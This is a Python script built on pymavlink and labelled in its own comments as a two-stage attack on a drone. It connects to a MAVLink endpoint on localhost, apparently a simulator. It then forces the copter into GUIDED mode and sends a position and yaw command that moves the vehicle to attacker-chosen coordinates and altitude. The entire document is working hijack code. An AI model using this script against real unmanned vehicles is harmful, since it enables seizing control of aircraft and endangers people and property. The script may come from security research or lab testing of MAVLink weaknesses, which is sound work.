import time
import math 
from pymavlink import mavutil

CONNECTION_STRING = 'udp:127.0.0.1:14550'
WAIT_BEFORE_ATTACK = 5
GUIDED_MODE_COPTER = 4

ATTACK_LAT = -55.3600
ATTACK_LON = 160.1600
ATTACK_ALT = 45
ATTACK_YAW_DEGREES = 180 # Face South
ATTACK_YAW_RADIANS = math.radians(ATTACK_YAW_DEGREES)

# --- Main Attack Logic ---
print(f"Connecting to vehicle on: {CONNECTION_STRING}")
try:
    master = mavutil.mavlink_connection(CONNECTION_STRING)
except Exception as e:
    print(f"Failed to connect: {e}")
    exit()

print("Waiting for heartbeat...")
master.wait_heartbeat()
print(f"Heartbeat from system (system {master.target_system} component {master.target_component})")

print(f"Waiting {WAIT_BEFORE_ATTACK} seconds before launching attack...")
time.sleep(WAIT_BEFORE_ATTACK)

print("\n!!! ATTACK STAGE 1: Forcing vehicle into GUIDED mode !!!")
master.mav.command_long_send(
    master.target_system,
    master.target_component,
    mavutil.mavlink.MAV_CMD_DO_SET_MODE,
    0,
    1,  
    GUIDED_MODE_COPTER,
    0, 0, 0, 0, 0 
)

print("Waiting for mode change confirmation...")
mode_changed = False
for _ in range(10): 
    msg = master.recv_match(type='HEARTBEAT', blocking=True, timeout=1)
    if msg and msg.custom_mode == GUIDED_MODE_COPTER:
        print("Mode change to GUIDED successful!")
        mode_changed = True
        break
    time.sleep(0.5)

if not mode_changed:
    print("Mode change failed or timed out. Aborting attack.")
    exit()

time.sleep(1) 

print("\n!!! ATTACK STAGE 2: Sending POS + YAW spoof command !!!")
master.mav.set_position_target_global_int_send(
    0, 
    master.target_system, 
    master.target_component,
    mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
    0b0000101111111000, # type_mask (Decimal: 3024)
    int(ATTACK_LAT * 1e7), 
    int(ATTACK_LON * 1e7), 
    ATTACK_ALT,            
    0, 0, 0, 
    0, 0, 0,
    ATTACK_YAW_RADIANS,  
    0)
